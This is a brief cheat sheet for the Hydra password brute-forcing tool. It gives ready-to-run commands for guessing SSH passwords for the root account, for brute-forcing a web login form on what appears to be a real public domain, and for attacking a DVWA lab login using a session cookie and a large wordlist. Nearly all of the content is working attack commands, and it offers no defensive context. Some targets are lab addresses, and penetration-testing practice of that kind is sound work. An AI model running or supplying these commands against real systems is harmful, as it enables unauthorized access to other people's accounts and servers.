
## HYDRA
Is a brute force tool  
  
```  
Usage : hydra -l <user> -P <password list> <protocol>://<ip>:<port> -t <threads> -V  


hydra -l root -P /usr/share/wordlists/metasploit/unix \_passwords.txt ssh://10.0.2.6:22 -t 4 -V

```

hydra -l {username} -P {password list path} -s {port} -f {Site Address} http-post-form “{Path to postback page}:{USERNAME\_NAME}=^USER^&{PASSWORD\_NAME}=^PASS^:{failed login text}”

```
hydra -l hydra -P password.lst -s 80 -f www.sillychicken.co.nz http-post-form “/administrator/index.php:usrname=^USER^&pass=^PASS^&submit=Login:Incorrect Username”
```


### HYDRA with PHPSESSID

```
hydra 192.168.0.105 -V -l admin -P ~/rockyou.txt http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=rname and/or password incorrect:H=Cookie: PHPSESSID=f8ucrbu0qmta4ettc3208gcvnq; security=low" -t 64

```